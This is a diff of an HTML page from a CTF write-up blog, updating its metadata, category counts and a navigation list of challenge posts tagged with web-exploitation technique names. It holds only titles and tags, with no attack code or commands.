@@ -2,22 +2,27 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>MIXBP</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="MIXBP">
+  <title>DDCTF2019-homebrew-event-loop | MIXBP</title>
+  <meta name="keywords" content=" python代码审计 , flask_session伪造 ">
+  <meta name="description" content="DDCTF2019-homebrew-event-loop | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="GYCTF2020-NodeGame参考博客： https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_61209261&#x2F;article&#x2F;details&#x2F;125778820 https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_46081055&#x2F;article&#x2F;details&#x2F;119982707 https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;241429 首先打开网页  发现两个">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CISCN2024-WEB-easycms">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/05/25/CISCN2024-WEB-easycms/index.html">
+<meta property="og:title" content="GYCTF2020-NodeGame">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/05/26/GYCTF2020-NodeGame/index.html">
 <meta property="og:site_name" content="MIXBP">
+<meta property="og:description" content="GYCTF2020-NodeGame参考博客： https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_61209261&#x2F;article&#x2F;details&#x2F;125778820 https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_46081055&#x2F;article&#x2F;details&#x2F;119982707 https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;241429 首先打开网页  发现两个">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-05-25T11:56:05.000Z">
-<meta property="article:modified_time" content="2025-05-25T11:57:40.600Z">
+<meta property="og:image" content="https://mixbp.github.io/image/GYCTF2020-NodeGame-1.png">
+<meta property="article:published_time" content="2025-05-26T12:51:49.000Z">
+<meta property="article:modified_time" content="2025-05-26T13:04:14.732Z">
 <meta property="article:author" content="MIXBP">
 <meta property="article:tag" content="ssrf">
-<meta property="article:tag" content="302跳转">
-<meta property="article:tag" content="反弹shell">
+<meta property="article:tag" content="node.js HTTP拆分攻击">
+<meta property="article:tag" content="crlf">
+<meta property="article:tag" content="http走私">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mixbp.github.io/image/GYCTF2020-NodeGame-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -55,7 +60,7 @@
 
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/"
    class="avatar_target">
@@ -116,7 +121,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(145)</small>
+                <small>(147)</small>
             
         </div>
     </li>
@@ -128,7 +133,7 @@
         <div data-rel="学习笔记">
             
             学习笔记
-            <small>(23)</small>
+            <small>(30)</small>
         </div>
         
     </li>
@@ -143,7 +148,7 @@
         <div data-rel="刷题笔记">
             
             刷题笔记
-            <small>(27)</small>
+            <small>(107)</small>
         </div>
         
     </li>
@@ -158,7 +163,7 @@
         <div data-rel="比赛复现">
             
             比赛复现
-            <small>(6)</small>
+            <small>(7)</small>
         </div>
         
     </li>
@@ -196,8 +201,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="145">
-<input type="hidden" id="yelog_site_word_count" value="246.7k">
+<input type="hidden" id="yelog_site_posts_number" value="147">
+<input type="hidden" id="yelog_site_word_count" value="251.4k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -311,10 +316,6 @@
             </li>
         
             <li class="article-tag-list-item">
-                <i class="iconfont icon-tag"></i><a>比赛复现</a>
-            </li>
-        
-            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>闭合</a>
             </li>
         
@@ -371,6 +372,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>构造$_GET</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>关键字过滤</a>
             </li>
         
@@ -387,6 +392,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>进制转换绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>经典盲文</a>
             </li>
         
@@ -396,6 +405,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>路径穿越</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>乱码修复</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -567,10 +580,6 @@
             </li>
         
             <li class="article-tag-list-item">
-                <i class="iconfont icon-tag"></i><a>学习笔记</a>
-            </li>
-        
-            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>压缩文件修复</a>
             </li>
         
@@ -596,6 +605,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>原型链污染</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>源码审计</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -687,6 +700,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>crlf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>CRLF</a>
             </li>
         
@@ -763,6 +780,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>flask_session伪造</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>Flask源码读取</a>
             </li>
         
@@ -820,6 +841,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>http协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>http走私</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -920,6 +945,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>nmap</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>node.js HTTP拆分攻击</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -1286,9 +1315,27 @@
     <nav id="title-list-nav">
         
         
+        <a  class="All "
+           href="/2025/05/26/GYCTF2020-NodeGame/"
+           data-tag="ssrf,node.js HTTP拆分攻击,crlf,http走私"
+           data-author="" >
+            <span class="post-title" title="GYCTF2020-NodeGame">GYCTF2020-NodeGame</span>
+            <span class="post-date" title="2025-05-26 20:51:49">2025/05/26</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/26/DDCTF2019-homebrew-event-loop/"
+           data-tag="python代码审计,flask_session伪造"
+           data-author="" >
+            <span class="post-title" title="DDCTF2019-homebrew-event-loop">DDCTF2019-homebrew-event-loop</span>
+            <span class="post-date" title="2025-05-26 16:39:46">2025/05/26</span>
+        </a>
+        
+        
         <a  class="All 刷题笔记 "
            href="/2025/05/25/CISCN2024-WEB-easycms/"
-           data-tag="ssrf,302跳转,反弹shell"
+           data-tag="乱码修复,cms,源码审计,ssrf,302跳转,反弹shell"
            data-author="" >
             <span class="post-title" title="CISCN2024-WEB-easycms">CISCN2024-WEB-easycms</span>
             <span class="post-date" title="2025-05-25 19:56:05">2025/05/25</span>
@@ -1351,7 +1398,7 @@
         
         <a  class="All 比赛复现 "
            href="/2025/05/20/HXCTF%E5%A4%8D%E7%8E%B0/"
-           data-tag="nc连接服务,netcat,沙箱逃逸,python命令执行,python代码审计,无回显ssti模版注入,ssti响应头回显"
+           data-tag="python代码审计,nc连接服务,netcat,沙箱逃逸,python命令执行,无回显ssti模版注入,ssti响应头回显"
            data-author="" >
             <span class="post-title" title="HXCTF复现">HXCTF复现</span>
             <span class="post-date" title="2025-05-20 20:14:41">2025/05/20</span>
@@ -1369,7 +1416,7 @@
         
         <a  class="All 刷题笔记 "
            href="/2025/05/20/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Easyphp2/"
-           data-tag="文件包含,getshell,php代码审计,php伪协议,二次编码绕过,提权"
+           data-tag="文件包含,php代码审计,getshell,php伪协议,二次编码绕过,提权"
            data-author="" >
             <span class="post-title" title="羊城杯2020-Easyphp2">羊城杯2020-Easyphp2</span>
             <span class="post-date" title="2025-05-20 17:39:03">2025/05/20</span>
@@ -1522,7 +1569,7 @@
         
         <a  class="All "
            href="/2025/05/05/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/"
-           data-tag="刷题笔记,代码审计,Flask源码读取,uuid.getnode()/Mac地址读取,预测随机种子,session密钥解密,管理员session伪造"
+           data-tag="代码审计,刷题笔记,Flask源码读取,uuid.getnode()/Mac地址读取,预测随机种子,session密钥解密,管理员session伪造"
            data-author="" >
             <span class="post-title" title="CISCN2019华东南赛区-Web4">CISCN2019华东南赛区-Web4</span>
             <span class="post-date" title="2025-05-05 01:59:58">2025/05/05</span>
@@ -1565,7 +1612,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/27/SUCTF2018-MultiSQL/"
            data-tag="刷题笔记,getshell,布尔盲注,堆叠注入,sql预处理,selet into outfile,char绕过"
            data-author="" >
@@ -1574,7 +1621,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/27/GYCTF2020-Ez-Express/"
            data-tag="js代码审计,原型链污染"
            data-author="" >
@@ -1583,7 +1630,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/27/GYCTF2020-Easyphp/"
            data-tag="代码审计,sql注入,反序列化,字符串增加逃逸"
            data-author="" >
@@ -1592,16 +1639,16 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/25/N1CTF2018-eating-cms/"
-           data-tag="代码审计,信息搜集,文件包含,文件上传,rce,parse_url绕过,parse_str绕过"
+           data-tag="文件包含,代码审计,信息搜集,文件上传,rce,parse_url绕过,parse_str绕过"
            data-author="" >
             <span class="post-title" title="N1CTF2018-eating_cms">N1CTF2018-eating_cms</span>
             <span class="post-date" title="2025-04-25 20:43:52">2025/04/25</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/24/SCTF2019-FlagShop/"
            data-tag="刷题笔记,ruby模块注入,jwt伪造,ruby预定义字符"
            data-author="" >
@@ -1610,7 +1657,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/24/HarekazeCTF2019-AvatarUploader/"
            data-tag="代码审计,upload,getimagesize,finfo_file"
            data-author="" >
@@ -1619,7 +1666,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/24/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp/"
            data-tag="代码审计,.htaccess新知识"
            data-author="" >
@@ -1628,7 +1675,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/22/ISITDTU2019-EasyPHP/"
            data-tag="刷题笔记,异或绕过进阶,无字母数字rce,限制字符种类绕过"
            data-author="" >
@@ -1637,7 +1684,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/22/BSidesCF2019-SVGMagic/"
            data-tag="xxe,svg"
            data-author="" >
@@ -1646,7 +1693,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/21/CSAWQual2019-Web-Unagi/"
            data-tag="xxe,upload,xxe漏洞waf绕过,xxe编码绕过"
            data-author="" >
@@ -1655,7 +1702,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/21/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-Greatphp/"
            data-tag="PHP原生类,取反绕过,php标签,Error/Exception"
            data-author="" >
@@ -1664,7 +1711,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/20/EasyBypass/"
            data-tag="php代码审计,rce,闭合"
            data-author="" >
@@ -1673,7 +1720,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/20/HFCTF2020-JustEscape/"
            data-tag="vm沙箱逃逸"
            data-author="" >
@@ -1682,7 +1729,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/20/SUCTF2018-GetShell/"
            data-tag="upload,webshell,无字母数字汉字取反构造webshell,fuzz字典"
            data-author="" >
@@ -1691,7 +1738,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/19/%E4%B9%9D%E8%BF%9E%E7%8E%AF/"
            data-tag="zip伪加密,steghide隐写"
            data-author="" >
@@ -1700,7 +1747,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/19/MakePHPGreatAgain/"
            data-tag="session文件包含,require_once,PHP_SESSION_UPLOAD_PROGRESS,条件竞争"
            data-author="" >
@@ -1709,7 +1756,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/19/%E5%81%87%E5%A6%82%E7%BB%99%E6%88%91%E4%B8%89%E5%A4%A9%E5%85%89%E6%98%8E/"
            data-tag="经典盲文,摩斯密码"
            data-author="" >
@@ -1727,25 +1774,25 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/17/GYCTF2020-EasyThinking/"
-           data-tag="刷题笔记,代码审计,thinkphp v6.0任意文件操作漏洞,webshell"
+           data-tag="代码审计,thinkphp v6.0任意文件操作漏洞,webshell"
            data-author="" >
             <span class="post-title" title="GYCTF2020-EasyThinking">GYCTF2020-EasyThinking</span>
             <span class="post-date" title="2025-04-17 16:40:30">2025/04/17</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/17/GKCTF2021-easycms/"
-           data-tag="getshell,弱口令密码,任意文件下载,cms"
+           data-tag="cms,getshell,弱口令密码,任意文件下载"
            data-author="" >
             <span class="post-title" title="GKCTF2021-easycms">GKCTF2021-easycms</span>
             <span class="post-date" title="2025-04-17 15:41:55">2025/04/17</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/16/%E4%BA%8C%E7%BB%B4%E7%A0%811/"
            data-tag="图片隐写,binwalk文件提取,ziperello工具暴力破解"
            data-author="" >
@@ -1763,18 +1810,18 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/15/BJDCTF2020-EzPHP/"
-           data-tag="刷题笔记,代码审计,php特性,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
+           data-tag="php特性,代码审计,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EzPHP">BJDCTF2020-EzPHP</span>
             <span class="post-date" title="2025-04-15 22:02:22">2025/04/15</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/15/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1/"
-           data-tag="刷题笔记,信息搜集,RC4加密,ssti"
+           data-tag="信息搜集,RC4加密,ssti"
            data-author="" >
             <span class="post-title" title="CISCN2019华东南赛区-DoubleSecret1">CISCN2019华东南赛区-DoubleSecret1</span>
             <span class="post-date" title="2025-04-15 21:39:44">2025/04/15</span>
@@ -1817,7 +1864,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/14/SUCTF2019-EasyWeb/"
            data-tag="文件上传,异或绕过,.haccess,无字母数字RCE"
            data-author="" >
@@ -1826,25 +1873,25 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/14/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/"
-           data-tag="刷题笔记,sql盲注,二次注入,sql加号运算注入"
+           data-tag="sql盲注,二次注入,sql加号运算注入"
            data-author="" >
             <span class="post-title" title="网鼎杯2018-Unfinish">网鼎杯2018-Unfinish</span>
             <span class="post-date" title="2025-04-14 17:16:41">2025/04/14</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/13/TGCTF-2025wp/"
-           data-tag="比赛复现"
+           data-tag="ssti,upload,rce"
            data-author="" >
             <span class="post-title" title="TGCTF-2025">TGCTF-2025</span>
             <span class="post-date" title="2025-04-13 15:53:03">2025/04/13</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/08/HarekazeCTF2019-encode-and-encode/"
            data-tag="代码审计,php伪协议,json绕过"
            data-author="" >
@@ -1853,7 +1900,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 比赛复现 "
            href="/2025/04/08/XYCTF2025-Signin/"
            data-tag="路径穿越,bottle,pickle反序列化漏洞"
            data-author="" >
@@ -1871,7 +1918,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment/"
            data-tag="代码审计,二次注入,burpsuite爆破密码,git文件泄露与复原,githacker,select load_file读取文件"
            data-author="" >
@@ -1880,7 +1927,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/07/NCTF2019-SQLi1/"
            data-tag="布尔盲注,;%00截断代替#和-,regexp注入,\转义单引号"
            data-author="" >
@@ -1889,7 +1936,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/06/NPUCTF2020-ezinclude/"
            data-tag="文件包含,md5,php7 segment fault 特性"
            data-author="" >
@@ -1898,7 +1945,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/06/CISCN2019%E6%80%BB%E5%86%B3%E8%B5%9BDay2Web1-Easyweb/"
            data-tag="sql盲注,sql语句闭合,str_replace,文件上传,短标签绕过"
            data-author="" >
@@ -1907,7 +1954,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/06/GYCTF2020-Ezsqli/"
            data-tag="fuzz测试,布尔盲注,sys数据库,无列名注入,无列名盲注"
            data-author="" >
@@ -1916,7 +1963,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/06/HFCTF2020-EasyLogin/"
            data-tag="jwt身份伪造"
            data-author="" >
@@ -1925,7 +1972,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/02/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"
            data-tag="文件读取,Python-Flask框架审计,Linux特殊文件,python反弹shell"
            data-author="" >
@@ -1934,7 +1981,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/02/HITCON2017-SSRFme/"
            data-tag="代码审计,ssrf,data伪协议,file伪协议,perl语言漏洞"
            data-author="" >
@@ -1943,61 +1990,61 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/02/RCTF2015-EasySQL/"
-           data-tag="刷题笔记,二次注入,报错注入,正则匹配查询,reverse"
+           data-tag="二次注入,报错注入,正则匹配查询,reverse"
            data-author="" >
             <span class="post-title" title="RCTF2015-EasySQL">RCTF2015-EasySQL</span>
             <span class="post-date" title="2025-04-02 17:21:06">2025/04/02</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/02/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADayWeb2-ikun/"
-           data-tag="刷题笔记,python反序列化,jwt密钥爆破,pickle"
+           data-tag="python反序列化,jwt密钥爆破,pickle"
            data-author="" >
             <span class="post-title" title="CISCN2019华北赛区DayWeb2-ikun">CISCN2019华北赛区DayWeb2-ikun</span>
             <span class="post-date" title="2025-04-02 17:20:50">2025/04/02</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/02/GWCTF2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"
-           data-tag="刷题笔记,mt_srand伪随机数漏洞,php_mt_seed工具"
+           data-tag="mt_srand伪随机数漏洞,php_mt_seed工具"
            data-author="" >
             <span class="post-title" title="GWCTF2019-枯燥的抽奖">GWCTF2019-枯燥的抽奖</span>
             <span class="post-date" title="2025-04-02 17:20:11">2025/04/02</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/04/01/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF2021-write-shell/"
-           data-tag="刷题笔记,短标签绕过,shell写入,空格过滤绕过,反引号执行命令"
+           data-tag="短标签绕过,shell写入,空格过滤绕过,反引号执行命令"
            data-author="" >
             <span class="post-title" title="红明谷CTF2021-write_shell">红明谷CTF2021-write_shell</span>
             <span class="post-date" title="2025-04-01 15:39:04">2025/04/01</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/31/MRCTF2020-%E5%A5%97%E5%A8%83/"
-           data-tag="刷题笔记,+%0a绕过正则,jsfuck编码,Client-ip头绕过,data://伪协议,逆推加密"
+           data-tag="+%0a绕过正则,jsfuck编码,Client-ip头绕过,data://伪协议,逆推加密"
            data-author="" >
             <span class="post-title" title="MRCTF2020-套娃">MRCTF2020-套娃</span>
             <span class="post-date" title="2025-03-31 17:45:15">2025/03/31</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/31/Zer0pts2020-Can-you-guess-it/"
-           data-tag="刷题笔记,代码审计,$_SERVER[‘PHP_SELF’],basename()函数"
+           data-tag="代码审计,$_SERVER[‘PHP_SELF’],basename()函数"
            data-author="" >
             <span class="post-title" title="Zer0pts2020-Can+you+guess+it">Zer0pts2020-Can+you+guess+it</span>
             <span class="post-date" title="2025-03-31 15:51:54">2025/03/31</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/30/SUCTF2019-Pythonginx/"
            data-tag="python代码审计,idna编码特性,nginx"
            data-author="" >
@@ -2006,7 +2053,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/30/FBCTF2019-RCEService1/"
            data-tag="+%0a绕过单行匹配正则,PCRE回溯次数绕过"
            data-author="" >
@@ -2015,108 +2062,108 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/30/CISCN2019%E5%88%9D%E8%B5%9B-LoveMath/"
-           data-tag="刷题笔记"
+           data-tag="RCE,构造$_GET,进制转换绕过"
            data-author="" >
             <span class="post-title" title="CISCN2019初赛-LoveMath">CISCN2019初赛-LoveMath</span>
             <span class="post-date" title="2025-03-30 16:21:31">2025/03/30</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/30/BJDCTF2020-EasySearch1/"
-           data-tag="刷题笔记,swp泄露,md5碰撞,代码审计,Apache SSI 远程命令执行漏洞"
+           data-tag="代码审计,swp泄露,md5碰撞,Apache SSI 远程命令执行漏洞"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EasySearch1">BJDCTF2020-EasySearch1</span>
             <span class="post-date" title="2025-03-30 14:24:01">2025/03/30</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL/"
-           data-tag="刷题笔记,sql注入,sql盲注,异或盲注"
+           data-tag="sql注入,sql盲注,异或盲注"
            data-author="" >
             <span class="post-title" title="极客大挑战2019-FinalSQL">极客大挑战2019-FinalSQL</span>
             <span class="post-date" title="2025-03-29 18:32:48">2025/03/29</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/29/ASIS2019-Unicorn-shop/"
-           data-tag="刷题笔记,unicode"
+           data-tag="unicode"
            data-author="" >
             <span class="post-title" title="ASIS2019-Unicorn-shop">ASIS2019-Unicorn-shop</span>
             <span class="post-date" title="2025-03-29 01:34:44">2025/03/29</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/29/NPUCTF2020-ReadlezPHP/"
-           data-tag="刷题笔记,php特性,assert和eval,动态调用方法"
+           data-tag="php特性,assert和eval,动态调用方法"
            data-author="" >
             <span class="post-title" title="NPUCTF2020-ReadlezPHP">NPUCTF2020-ReadlezPHP</span>
             <span class="post-date" title="2025-03-29 01:34:13">2025/03/29</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-RCE-ME/"
-           data-tag="刷题笔记,异或绕过,无字母数字RCE,取反绕过"
+           data-tag="异或绕过,无字母数字RCE,取反绕过"
            data-author="" >
             <span class="post-title" title="极客大挑战2019-RCE-ME">极客大挑战2019-RCE-ME</span>
             <span class="post-date" title="2025-03-29 01:33:00">2025/03/29</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/29/SWPU2019-Web1/"
-           data-tag="刷题笔记,sql注入,无列名注入,二次注入,MariaDB数据库"
+           data-tag="sql注入,无列名注入,二次注入,MariaDB数据库"
            data-author="" >
             <span class="post-title" title="SWPU2019-Web1">SWPU2019-Web1</span>
             <span class="post-date" title="2025-03-29 01:32:39">2025/03/29</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/28/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/"
-           data-tag="刷题笔记,nmap,escapeshellarg和escapeshellcmd函数的绕过"
+           data-tag="nmap,escapeshellarg和escapeshellcmd函数的绕过"
            data-author="" >
             <span class="post-title" title="网鼎杯2020朱雀组-Nmap">网鼎杯2020朱雀组-Nmap</span>
             <span class="post-date" title="2025-03-28 22:26:14">2025/03/28</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A21/"
-           data-tag="刷题笔记,信息搜集,python脚本编写"
+           data-tag="信息搜集,python脚本编写"
            data-author="" >
             <span class="post-title" title="强网杯2019-高明的黑客1">强网杯2019-高明的黑客1</span>
             <span class="post-date" title="2025-03-28 21:33:56">2025/03/28</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy-serialize-php1/"
-           data-tag="刷题笔记,php反序列化,字符串逃逸,extract覆盖函数"
+           data-tag="php反序列化,字符串逃逸,extract覆盖函数"
            data-author="" >
             <span class="post-title" title="安洵杯2019-easy_serialize_php1">安洵杯2019-easy_serialize_php1</span>
             <span class="post-date" title="2025-03-28 20:49:15">2025/03/28</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/28/ez-php/"
-           data-tag="刷题笔记,php反序列化,特殊变量名传参,gc回收,反序列化逃逸"
+           data-tag="php反序列化,特殊变量名传参,gc回收,反序列化逃逸"
            data-author="" >
             <span class="post-title" title="ez_php">ez_php</span>
             <span class="post-date" title="2025-03-28 16:41:00">2025/03/28</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/27/Sql-Inject-or-RCE/"
-           data-tag="刷题笔记,sql注入,堆叠注入,handler读表,delimiter更改sql语句结束符"
+           data-tag="sql注入,堆叠注入,handler读表,delimiter更改sql语句结束符"
            data-author="" >
             <span class="post-title" title="Sql-Inject-or-RCE">Sql-Inject-or-RCE</span>
             <span class="post-date" title="2025-03-27 22:04:19">2025/03/27</span>
@@ -2132,54 +2179,54 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/27/only-one-sql/"
-           data-tag="刷题笔记,sql注入,sql盲注"
+           data-tag="sql注入,sql盲注"
            data-author="" >
             <span class="post-title" title="only-one-sql">only-one-sql</span>
             <span class="post-date" title="2025-03-27 21:04:25">2025/03/27</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/26/%E5%A4%8D%E8%AF%BB%E6%9C%BA/"
-           data-tag="刷题笔记,ssti,chr函数构造命令"
+           data-tag="ssti,chr函数构造命令"
            data-author="" >
             <span class="post-title" title="复读机">复读机</span>
             <span class="post-date" title="2025-03-26 23:37:23">2025/03/26</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/26/%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82MD5/"
-           data-tag="刷题笔记,php特性,md5"
+           data-tag="php特性,md5"
            data-author="" >
